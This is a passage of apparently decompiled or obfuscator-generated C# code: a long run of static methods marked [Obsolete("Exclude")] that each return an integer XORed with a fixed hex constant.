		return int_4 ^ 0x56D8C130;
	}

	[Obsolete("Exclude")]
	public static int smethod_7908(int int_4)
	{
		return int_4 ^ 0x76DAC443;
	}

	[Obsolete("Exclude")]
	public static int smethod_7909(int int_4)
	{
		return int_4 ^ 0x26AE2311;
	}

	[Obsolete("Exclude")]
	public static int smethod_7910(int int_4)
	{
		return int_4 ^ 0x72D6BB71;
	}

	[Obsolete("Exclude")]
	public static int smethod_7911(int int_4)
	{
		return int_4 ^ 0x2729C4D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7912(int int_4)
	{
		return int_4 ^ 0x7DC43B39;
	}

	[Obsolete("Exclude")]
	public static int smethod_7916(int int_4)
	{
		return int_4 ^ 0x42F3808C;
	}

	[Obsolete("Exclude")]
	public static int smethod_7917(int int_4)
	{
		return int_4 ^ 0x2E4FC8AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_7918(int int_4)
	{
		return int_4 ^ 0x2EE6D2EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7919(int int_4)
	{
		return int_4 ^ 0x7EC37327;
	}

	[Obsolete("Exclude")]
	public static int smethod_7920(int int_4)
	{
		return int_4 ^ 0x31AE90FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7921(int int_4)
	{
		return int_4 ^ 0x34AFF931;
	}

	[Obsolete("Exclude")]
	public static int smethod_7928(int int_4)
	{
		return int_4 ^ 0x7770C97E;
	}

	[Obsolete("Exclude")]
	public static int smethod_7930(int int_4)
	{
		return int_4 ^ 0x3060CDB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7931(int int_4)
	{
		return int_4 ^ 0x3B380781;
	}

	[Obsolete("Exclude")]
	public static int smethod_7932(int int_4)
	{
		return int_4 ^ 0x771CDEE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_7933(int int_4)
	{
		return int_4 ^ 0xE4AC73F;
	}

	[Obsolete("Exclude")]
	public static int smethod_7934(int int_4)
	{
		return int_4 ^ 0x7B4A7CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7935(int int_4)
	{
		return int_4 ^ 0x38420743;
	}

	[Obsolete("Exclude")]
	public static int smethod_7938(int int_4)
	{
		return int_4 ^ 0x20EB36A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7940(int int_4)
	{
		return int_4 ^ 0x46837BAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7942(int int_4)
	{
		return int_4 ^ 0x148CB71;
	}

	[Obsolete("Exclude")]
	public static int smethod_7945(int int_4)
	{
		return int_4 ^ 0x17E6879B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7947(int int_4)
	{
		return int_4 ^ 0x44E2D0F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_7949(int int_4)
	{
		return int_4 ^ 0x7D2F25CE;
	}

	[Obsolete("Exclude")]
	public static int smethod_7951(int int_4)
	{
		return int_4 ^ 0x576AB938;
	}

	[Obsolete("Exclude")]
	public static int smethod_7953(int int_4)
	{
		return int_4 ^ 0x1F7190CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_7954(int int_4)
	{
		return int_4 ^ 0x43558570;
	}

	[Obsolete("Exclude")]
	public static int smethod_7956(int int_4)
	{
		return int_4 ^ 0x52C48234;
	}

	[Obsolete("Exclude")]
	public static int smethod_7959(int int_4)
	{
		return int_4 ^ 0x4FE93F0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7960(int int_4)
	{
		return int_4 ^ 0x6425C858;
	}

	[Obsolete("Exclude")]
	public static int smethod_7962(int int_4)
	{
		return int_4 ^ 0x6B191365;
	}

	[Obsolete("Exclude")]
	public static int smethod_7963(int int_4)
	{
		return int_4 ^ 0x445BE273;
	}

	[Obsolete("Exclude")]
	public static int smethod_7965(int int_4)
	{
		return int_4 ^ 0x1B284E61;
	}

	[Obsolete("Exclude")]
	public static int smethod_7970(int int_4)
	{
		return int_4 ^ 0x6A14B4B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7971(int int_4)
	{
		return int_4 ^ 0x2072E2C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_7973(int int_4)
	{
		return int_4 ^ 0x2F2D8A3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7975(int int_4)
	{
		return int_4 ^ 0x11EEE5CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_7977(int int_4)
	{
		return int_4 ^ 0x2CE18E28;
	}

	[Obsolete("Exclude")]
	public static int smethod_7979(int int_4)
	{
		return int_4 ^ 0x4379BF50;
	}

	[Obsolete("Exclude")]
	public static int smethod_7980(int int_4)
	{
		return int_4 ^ 0x757BB999;
	}

	[Obsolete("Exclude")]
	public static int smethod_7982(int int_4)
	{
		return int_4 ^ 0x2987EAA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_7983(int int_4)
	{
		return int_4 ^ 0x4399ABC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_7984(int int_4)
	{
		return int_4 ^ 0x2D8C11D;
	}

	[Obsolete("Exclude")]
	public static int smethod_7985(int int_4)
	{
		return int_4 ^ 0x4DEC4848;
	}

	[Obsolete("Exclude")]
	public static int smethod_7986(int int_4)
	{
		return int_4 ^ 0x4B4DEB96;
	}

	[Obsolete("Exclude")]
	public static int smethod_7989(int int_4)
	{
		return int_4 ^ 0x69D45944;
	}

	[Obsolete("Exclude")]
	public static int smethod_7990(int int_4)
	{
		return int_4 ^ 0x240D3DE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_7993(int int_4)
	{
		return int_4 ^ 0x4CE100A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_7994(int int_4)
	{
		return int_4 ^ 0xBB91D2B;
	}

	[Obsolete("Exclude")]
	public static int smethod_7995(int int_4)
	{
		return int_4 ^ 0x4387F684;
	}

	[Obsolete("Exclude")]
	public static int smethod_7998(int int_4)
	{
		return int_4 ^ 0x3EEF52F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8000(int int_4)
	{
		return int_4 ^ 0x2F2081DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8001(int int_4)
	{
		return int_4 ^ 0x4D22032;
	}

	[Obsolete("Exclude")]
	public static int smethod_8005(int int_4)
	{
		return int_4 ^ 0x82AF60F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8006(int int_4)
	{
		return int_4 ^ 0x4806BE3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8007(int int_4)
	{
		return int_4 ^ 0x599FDDA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8008(int int_4)
	{
		return int_4 ^ 0x23A5ED4C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8010(int int_4)
	{
		return int_4 ^ 0x9E4F24D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8011(int int_4)
	{
		return int_4 ^ 0x15EF9E32;
	}

	[Obsolete("Exclude")]
	public static int smethod_8013(int int_4)
	{
		return int_4 ^ 0x72702E35;
	}

	[Obsolete("Exclude")]
	public static int smethod_8015(int int_4)
	{
		return int_4 ^ 0x3F60D836;
	}

	[Obsolete("Exclude")]
	public static int smethod_8016(int int_4)
	{
		return int_4 ^ 0x31E42EA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8017(int int_4)
	{
		return int_4 ^ 0x35C8FF33;
	}

	[Obsolete("Exclude")]
	public static int smethod_8019(int int_4)
	{
		return int_4 ^ 0x3B1A2E38;
	}

	[Obsolete("Exclude")]
	public static int smethod_8021(int int_4)
	{
		return int_4 ^ 0x7C9D0B43;
	}

	[Obsolete("Exclude")]
	public static int smethod_8023(int int_4)
	{
		return int_4 ^ 0x125BA738;
	}

	[Obsolete("Exclude")]
	public static int smethod_8026(int int_4)
	{
		return int_4 ^ 0x8DBCDCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8027(int int_4)
	{
		return int_4 ^ 0x64DBE2F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8028(int int_4)
	{
		return int_4 ^ 0x4EF3F96A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8037(int int_4)
	{
		return int_4 ^ 0x66B0D7BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8040(int int_4)
	{
		return int_4 ^ 0x23F5A9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8041(int int_4)
	{
		return int_4 ^ 0x5DE02261;
	}

	[Obsolete("Exclude")]
	public static int smethod_8042(int int_4)
	{
		return int_4 ^ 0x17CF2324;
	}

	[Obsolete("Exclude")]
	public static int smethod_8045(int int_4)
	{
		return int_4 ^ 0x6F92F04C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8046(int int_4)
	{
		return int_4 ^ 0x4A264608;
	}

	[Obsolete("Exclude")]
	public static int smethod_8049(int int_4)
	{
		return int_4 ^ 0x16DC3C89;
	}

	[Obsolete("Exclude")]
	public static int smethod_8050(int int_4)
	{
		return int_4 ^ 0x9D1F126;
	}

	[Obsolete("Exclude")]
	public static int smethod_8051(int int_4)
	{
		return int_4 ^ 0x5A9DE75F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8052(int int_4)
	{
		return int_4 ^ 0x591FDDE3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8054(int int_4)
	{
		return int_4 ^ 0x4467E2DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8055(int int_4)
	{
		return int_4 ^ 0x476F8651;
	}

	[Obsolete("Exclude")]
	public static int smethod_8057(int int_4)
	{
		return int_4 ^ 0x18D00809;
	}

	[Obsolete("Exclude")]
	public static int smethod_8058(int int_4)
	{
		return int_4 ^ 0x31002E2F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8059(int int_4)
	{
		return int_4 ^ 0x35D75E41;
	}

	[Obsolete("Exclude")]
	public static int smethod_8060(int int_4)
	{
		return int_4 ^ 0x3DEFEC89;
	}

	[Obsolete("Exclude")]
	public static int smethod_8064(int int_4)
	{
		return int_4 ^ 0x3FEFA6B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8065(int int_4)
	{
		return int_4 ^ 0x1C699B38;
	}

	[Obsolete("Exclude")]
	public static int smethod_8066(int int_4)
	{
		return int_4 ^ 0x7DF5586B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8067(int int_4)
	{
		return int_4 ^ 0x6BF62194;
	}

	[Obsolete("Exclude")]
	public static int smethod_8068(int int_4)
	{
		return int_4 ^ 0x1BFCA5F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8072(int int_4)
	{
		return int_4 ^ 0x656ACF2A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8073(int int_4)
	{
		return int_4 ^ 0x2376E663;
	}

	[Obsolete("Exclude")]
	public static int smethod_8074(int int_4)
	{
		return int_4 ^ 0x562668D1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8076(int int_4)
	{
		return int_4 ^ 0x36FFA3F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8077(int int_4)
	{
		return int_4 ^ 0x303141EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8078(int int_4)
	{
		return int_4 ^ 0xFA86BBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8079(int int_4)
	{
		return int_4 ^ 0x19DDFCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8080(int int_4)
	{
		return int_4 ^ 0x30E69FC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8081(int int_4)
	{
		return int_4 ^ 0x1AA3696C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8083(int int_4)
	{
		return int_4 ^ 0x22C7E4AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8084(int int_4)
	{
		return int_4 ^ 0x48AC9B6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8087(int int_4)
	{
		return int_4 ^ 0x7786ED22;
	}

	[Obsolete("Exclude")]
	public static int smethod_8089(int int_4)
	{
		return int_4 ^ 0x2EAB8119;
	}

	[Obsolete("Exclude")]
	public static int smethod_8090(int int_4)
	{
		return int_4 ^ 0x732BBCB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_8091(int int_4)
	{
		return int_4 ^ 0x29DBF3C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8095(int int_4)
	{
		return int_4 ^ 0x32A394F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8096(int int_4)
	{
		return int_4 ^ 0x676D782F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8097(int int_4)
	{
		return int_4 ^ 0x4589FA0F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8098(int int_4)
	{
		return int_4 ^ 0xDCAD121;
	}

	[Obsolete("Exclude")]
	public static int smethod_8101(int int_4)
	{
		return int_4 ^ 0x4C3BE28F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8104(int int_4)
	{
		return int_4 ^ 0x2639CCD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8106(int int_4)
	{
		return int_4 ^ 0x12C6B061;
	}

	[Obsolete("Exclude")]
	public static int smethod_8107(int int_4)
	{
		return int_4 ^ 0x2747042D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8108(int int_4)
	{
		return int_4 ^ 0x7871129B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8110(int int_4)
	{
		return int_4 ^ 0x4356C365;
	}

	[Obsolete("Exclude")]
	public static int smethod_8111(int int_4)
	{
		return int_4 ^ 0x1B8CEECF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8114(int int_4)
	{
		return int_4 ^ 0x20DE5C55;
	}

	[Obsolete("Exclude")]
	public static int smethod_8115(int int_4)
	{
		return int_4 ^ 0x41DCD100;
	}

	[Obsolete("Exclude")]
	public static int smethod_8117(int int_4)
	{
		return int_4 ^ 0x2F90C279;
	}

	[Obsolete("Exclude")]
	public static int smethod_8121(int int_4)
	{
		return int_4 ^ 0x1EE2DAC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8124(int int_4)
	{
		return int_4 ^ 0x619F0955;
	}

	[Obsolete("Exclude")]
	public static int smethod_8125(int int_4)
	{
		return int_4 ^ 0x19A87517;
	}

	[Obsolete("Exclude")]
	public static int smethod_8127(int int_4)
	{
		return int_4 ^ 0xAC7EC72;
	}

	[Obsolete("Exclude")]
	public static int smethod_8128(int int_4)
	{
		return int_4 ^ 0x8819498;
	}

	[Obsolete("Exclude")]
	public static int smethod_8131(int int_4)
	{
		return int_4 ^ 0x740608AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8134(int int_4)
	{
		return int_4 ^ 0x5AB0B8EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8135(int int_4)
	{
		return int_4 ^ 0x5A3CC285;
	}

	[Obsolete("Exclude")]
	public static int smethod_8136(int int_4)
	{
		return int_4 ^ 0x58D9E609;
	}

	[Obsolete("Exclude")]
	public static int smethod_8139(int int_4)
	{
		return int_4 ^ 0x7D0C916D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8141(int int_4)
	{
		return int_4 ^ 0x7A5796BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8142(int int_4)
	{
		return int_4 ^ 0xCED4F95;
	}

	[Obsolete("Exclude")]
	public static int smethod_8143(int int_4)
	{
		return int_4 ^ 0x12E37E8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8146(int int_4)
	{
		return int_4 ^ 0x394C4163;
	}

	[Obsolete("Exclude")]
	public static int smethod_8147(int int_4)
	{
		return int_4 ^ 0x8E674AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8149(int int_4)
	{
		return int_4 ^ 0x2583EC4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8150(int int_4)
	{
		return int_4 ^ 0x211AD79B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8153(int int_4)
	{
		return int_4 ^ 0x7A381386;
	}

	[Obsolete("Exclude")]
	public static int smethod_8157(int int_4)
	{
		return int_4 ^ 0x49AD2337;
	}

	[Obsolete("Exclude")]
	public static int smethod_8160(int int_4)
	{
		return int_4 ^ 0x25572AE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8163(int int_4)
	{
		return int_4 ^ 0x649CFD49;
	}

	[Obsolete("Exclude")]
	public static int smethod_8165(int int_4)
	{
		return int_4 ^ 0x1C84F319;
	}

	[Obsolete("Exclude")]
	public static int smethod_8166(int int_4)
	{
		return int_4 ^ 0x6A3153D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8167(int int_4)
	{
		return int_4 ^ 0x3B977DBC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8168(int int_4)
	{
		return int_4 ^ 0x75A19466;
	}

	[Obsolete("Exclude")]
	public static int smethod_8170(int int_4)
	{
		return int_4 ^ 0x7091701E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8171(int int_4)
	{
		return int_4 ^ 0x56FD76AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8172(int int_4)
	{
		return int_4 ^ 0x65162225;
	}

	[Obsolete("Exclude")]
	public static int smethod_8175(int int_4)
	{
		return int_4 ^ 0x67204CC1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8176(int int_4)
	{
		return int_4 ^ 0x28B603FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8179(int int_4)
	{
		return int_4 ^ 0x497C28EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8182(int int_4)
	{
		return int_4 ^ 0xB8C8BDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8183(int int_4)
	{
		return int_4 ^ 0xAC5FBAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8186(int int_4)
	{
		return int_4 ^ 0x3CAEE048;
	}

	[Obsolete("Exclude")]
	public static int smethod_8187(int int_4)
	{
		return int_4 ^ 0x3741A55F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8190(int int_4)
	{
		return int_4 ^ 0x76A966EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8191(int int_4)
	{
		return int_4 ^ 0xB4340D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8195(int int_4)
	{
		return int_4 ^ 0x267DB8A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8196(int int_4)
	{
		return int_4 ^ 0x597E30B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_8201(int int_4)
	{
		return int_4 ^ 0x48DFE3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8202(int int_4)
	{
		return int_4 ^ 0x3E67AD62;
	}

	[Obsolete("Exclude")]
	public static int smethod_8203(int int_4)
	{
		return int_4 ^ 0x7E8EE8BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8205(int int_4)
	{
		return int_4 ^ 0x630D7067;
	}

	[Obsolete("Exclude")]
	public static int smethod_8208(int int_4)
	{
		return int_4 ^ 0x275B6F9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8209(int int_4)
	{
		return int_4 ^ 0x115E2CBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8210(int int_4)
	{
		return int_4 ^ 0x456B2DFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8212(int int_4)
	{
		return int_4 ^ 0x320FFCFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8213(int int_4)
	{
		return int_4 ^ 0x7E0C37FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8222(int int_4)
	{
		return int_4 ^ 0x5C1914EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8224(int int_4)
	{
		return int_4 ^ 0x6F65C977;
	}

	[Obsolete("Exclude")]
	public static int smethod_8225(int int_4)
	{
		return int_4 ^ 0x6F682E60;
	}

	[Obsolete("Exclude")]
	public static int smethod_8227(int int_4)
	{
		return int_4 ^ 0x1EC418D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8228(int int_4)
	{
		return int_4 ^ 0xE60EBE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8229(int int_4)
	{
		return int_4 ^ 0x675B1877;
	}

	[Obsolete("Exclude")]
	public static int smethod_8230(int int_4)
	{
		return int_4 ^ 0x44C886FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8231(int int_4)
	{
		return int_4 ^ 0x33A5E294;
	}

	[Obsolete("Exclude")]
	public static int smethod_8234(int int_4)
	{
		return int_4 ^ 0x300ECD31;
	}

	[Obsolete("Exclude")]
	public static int smethod_8237(int int_4)
	{
		return int_4 ^ 0x886EB6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8238(int int_4)
	{
		return int_4 ^ 0x6D458A20;
	}

	[Obsolete("Exclude")]
	public static int smethod_8240(int int_4)
	{
		return int_4 ^ 0x6A7FE3DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8241(int int_4)
	{
		return int_4 ^ 0xBE2C8A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8243(int int_4)
	{
		return int_4 ^ 0x58BE68EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8244(int int_4)
	{
		return int_4 ^ 0x4E1007FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8245(int int_4)
	{
		return int_4 ^ 0x28574840;
	}

	[Obsolete("Exclude")]
	public static int smethod_8246(int int_4)
	{
		return int_4 ^ 0x1D1B7B78;
	}

	[Obsolete("Exclude")]
	public static int smethod_8247(int int_4)
	{
		return int_4 ^ 0x5449C788;
	}

	[Obsolete("Exclude")]
	public static int smethod_8248(int int_4)
	{
		return int_4 ^ 0x6A9764BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8249(int int_4)
	{
		return int_4 ^ 0x62BB16DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8251(int int_4)
	{
		return int_4 ^ 0x9450A8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8252(int int_4)
	{
		return int_4 ^ 0x361A69BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8253(int int_4)
	{
		return int_4 ^ 0x364D7B73;
	}

	[Obsolete("Exclude")]
	public static int smethod_8254(int int_4)
	{
		return int_4 ^ 0x713DA243;
	}

	[Obsolete("Exclude")]
	public static int smethod_8256(int int_4)
	{
		return int_4 ^ 0x21E8FE87;
	}

	[Obsolete("Exclude")]
	public static int smethod_8257(int int_4)
	{
		return int_4 ^ 0x2EBA58BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8258(int int_4)
	{
		return int_4 ^ 0x54BD8A55;
	}

	[Obsolete("Exclude")]
	public static int smethod_8259(int int_4)
	{
		return int_4 ^ 0x24887691;
	}

	[Obsolete("Exclude")]
	public static int smethod_8260(int int_4)
	{
		return int_4 ^ 0x456DBB8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8261(int int_4)
	{
		return int_4 ^ 0x1D584C01;
	}

	[Obsolete("Exclude")]
	public static int smethod_8267(int int_4)
	{
		return int_4 ^ 0xDA2F9A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8268(int int_4)
	{
		return int_4 ^ 0x1E4797A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8272(int int_4)
	{
		return int_4 ^ 0x74C492E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8273(int int_4)
	{
		return int_4 ^ 0x7501621A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8277(int int_4)
	{
		return int_4 ^ 0x365667C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8278(int int_4)
	{
		return int_4 ^ 0x6F5A9CDE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8279(int int_4)
	{
		return int_4 ^ 0x4E022F19;
	}

	[Obsolete("Exclude")]
	public static int smethod_8280(int int_4)
	{
		return int_4 ^ 0x7A62F2FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8281(int int_4)
	{
		return int_4 ^ 0x3171CADD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8282(int int_4)
	{
		return int_4 ^ 0x4AB9A371;
	}

	[Obsolete("Exclude")]
	public static int smethod_8283(int int_4)
	{
		return int_4 ^ 0x31C2FF3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8284(int int_4)
	{
		return int_4 ^ 0xE876CC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8287(int int_4)
	{
		return int_4 ^ 0x1219BF6D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8288(int int_4)
	{
		return int_4 ^ 0x453F01B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8293(int int_4)
	{
		return int_4 ^ 0x1BF4A39E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8296(int int_4)
	{
		return int_4 ^ 0x75EA0E6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8298(int int_4)
	{
		return int_4 ^ 0x32973E88;
	}

	[Obsolete("Exclude")]
	public static int smethod_8302(int int_4)
	{
		return int_4 ^ 0x78F2E1DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8305(int int_4)
	{
		return int_4 ^ 0x77434F5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8307(int int_4)
	{
		return int_4 ^ 0x62AF48E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8308(int int_4)
	{
		return int_4 ^ 0x1F28B7A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8312(int int_4)
	{
		return int_4 ^ 0x641C6935;
	}

	[Obsolete("Exclude")]
	public static int smethod_8313(int int_4)
	{
		return int_4 ^ 0x47254453;
	}

	[Obsolete("Exclude")]
	public static int smethod_8317(int int_4)
	{
		return int_4 ^ 0x212218A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8318(int int_4)
	{
		return int_4 ^ 0x2A2453B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8319(int int_4)
	{
		return int_4 ^ 0x51E125EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8320(int int_4)
	{
		return int_4 ^ 0x264B3A3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8323(int int_4)
	{
		return int_4 ^ 0x25C79733;
	}

	[Obsolete("Exclude")]
	public static int smethod_8324(int int_4)
	{
		return int_4 ^ 0x29F4CB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8326(int int_4)
	{
		return int_4 ^ 0x53BF24D0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8328(int int_4)
	{
		return int_4 ^ 0x412C7548;
	}

	[Obsolete("Exclude")]
	public static int smethod_8329(int int_4)
	{
		return int_4 ^ 0x7978989;
	}

	[Obsolete("Exclude")]
	public static int smethod_8332(int int_4)
	{
		return int_4 ^ 0x724992B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8333(int int_4)
	{
		return int_4 ^ 0x32FBB1E5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8335(int int_4)
	{
		return int_4 ^ 0x10911613;
	}

	[Obsolete("Exclude")]
	public static int smethod_8338(int int_4)
	{
		return int_4 ^ 0x714C0D53;
	}

	[Obsolete("Exclude")]
	public static int smethod_8340(int int_4)
	{
		return int_4 ^ 0x479B8F0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8341(int int_4)
	{
		return int_4 ^ 0x5847E92D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8345(int int_4)
	{
		return int_4 ^ 0x1296FA2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8346(int int_4)
	{
		return int_4 ^ 0x2E57D987;
	}

	[Obsolete("Exclude")]
	public static int smethod_8347(int int_4)
	{
		return int_4 ^ 0x5F0C245E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8352(int int_4)
	{
		return int_4 ^ 0x2FCD6663;
	}

	[Obsolete("Exclude")]
	public static int smethod_8356(int int_4)
	{
		return int_4 ^ 0x6BCBF36A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8360(int int_4)
	{
		return int_4 ^ 0x7D57A6EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8365(int int_4)
	{
		return int_4 ^ 0x3977413B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8367(int int_4)
	{
		return int_4 ^ 0x42DE1980;
	}

	[Obsolete("Exclude")]
	public static int smethod_8368(int int_4)
	{
		return int_4 ^ 0x53D1E87D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8375(int int_4)
	{
		return int_4 ^ 0x5576FE86;
	}

	[Obsolete("Exclude")]
	public static int smethod_8378(int int_4)
	{
		return int_4 ^ 0x18AC0551;
	}

	[Obsolete("Exclude")]
	public static int smethod_8379(int int_4)
	{
		return int_4 ^ 0xC4BD58C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8382(int int_4)
	{
		return int_4 ^ 0x718C0987;
	}

	[Obsolete("Exclude")]
	public static int smethod_8383(int int_4)
	{
		return int_4 ^ 0x3EAD3676;
	}

	[Obsolete("Exclude")]
	public static int smethod_8387(int int_4)
	{
		return int_4 ^ 0xAD3D8AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8388(int int_4)
	{
		return int_4 ^ 0x225D771;
	}

	[Obsolete("Exclude")]
	public static int smethod_8389(int int_4)
	{
		return int_4 ^ 0x19F69FDF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8391(int int_4)
	{
		return int_4 ^ 0x24534214;
	}

	[Obsolete("Exclude")]
	public static int smethod_8392(int int_4)
	{
		return int_4 ^ 0x7EDABE61;
	}

	[Obsolete("Exclude")]
	public static int smethod_8396(int int_4)
	{
		return int_4 ^ 0x4071A075;
	}

	[Obsolete("Exclude")]
	public static int smethod_8397(int int_4)
	{
		return int_4 ^ 0x6290445F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8398(int int_4)
	{
		return int_4 ^ 0x4A99B28B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8400(int int_4)
	{
		return int_4 ^ 0x77210FA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8401(int int_4)
	{
		return int_4 ^ 0x79BC40;
	}

	[Obsolete("Exclude")]
	public static int smethod_8405(int int_4)
	{
		return int_4 ^ 0x7BC26874;
	}

	[Obsolete("Exclude")]
